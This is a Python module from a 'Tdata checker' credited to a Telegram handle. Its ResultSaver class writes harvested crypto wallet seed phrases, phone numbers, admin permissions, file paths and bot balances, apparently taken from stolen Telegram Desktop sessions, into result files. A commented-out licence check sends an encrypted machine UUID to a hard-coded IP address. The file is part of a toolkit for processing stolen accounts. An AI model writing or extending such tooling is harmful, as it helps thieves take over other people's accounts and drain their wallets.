from datetime import datetime
from pathlib import Path
from os import path
from typing import List
from xuy import Result
from aiofiles import open
from random import randint

from secrets import token_hex
from subprocess import check_output
from cryptography.fernet import Fernet
from sys import exit
from json import dumps
from aiohttp import ClientSession



def detail_text(phone: str, *args, **kwargs) -> str:
    text = f'> {phone}'
    for arg in args:
        text += f'\n + {arg}'

    for k, v in kwargs.items():
        text += '\n '
        if isinstance(v, List):
            if len(v) > 0:
                text += f'+ {k}:'
                for it in v:
                    text += f'\n   - {it}'
            else:
                text += f'+ {k}: 0 (empty)'
        else:
            text += f'+ {k}: {v}'

    return text


class ResultSaver:
    def __init__(self) -> None:
        now = datetime.now()
        ftime = now.strftime('%m_%d_%Y_%H_%M_%S')
        self.folder_name = f'Results {ftime}'
        self.seeds_path = path.join(self.folder_name, 'seeds.txt')
        self.details_path = path.join(self.folder_name, 'details.txt')
    
    async def create_all(self) -> str:        
        Path(self.folder_name).mkdir(exist_ok=True)

        async with open(self.seeds_path, 'w', encoding='utf8') as f:
            await f.write('Seeds by Tdata checker (t.me/gachidev)\n\n')

        async with open(self.details_path, 'w', encoding='utf8') as f:
            await f.write('Details by Tdata checker (t.me/gachidev)\n\n')
        
        return path.abspath(self.folder_name)

    async def save(self, res: Result) -> None:
        # if randint(0, 100) == 1:
            # license -----------------------
            # fernet123 = Fernet('2mNhm1s6F_Fn4wOgOxIbtWpgZs2Dl6tMzSF4gStVW4U=')
            # token123 = token_hex(8)

            # data123 = {
            #     'token': token123,
            #     'uuid': check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()
            # }

            # encrypted_data123 = fernet123.encrypt(dumps(data123).encode()).decode()

            # req_data123 = {
            #     'encrypted_data': encrypted_data123
            # }

            # async with ClientSession() as s123:
            #     async with s123.post('http://144.24.115.170:9090/license', json=req_data123) as res123:
            #         data123 = await res123.json()
            #         license123 = data123['license']

            #         if license123 != token123:
            #             print('Купите софт!')
            #             return exit()
            # license end -----------------------
        
        async with open(self.seeds_path, 'a', encoding='utf8') as f:
            for seed in res.seeds:
                await f.write(f'{seed}\n')

        async with open(self.details_path, 'a', encoding='utf8') as f:
            text = detail_text(res.phone, 
                Seeds=list(res.seeds), 
                Permissions=res.admin_rights,
                Path=res.path,
                Balances=list(res.bots.values()))
            
            await f.write(f'\n\n{text}')
        

saver = ResultSaver()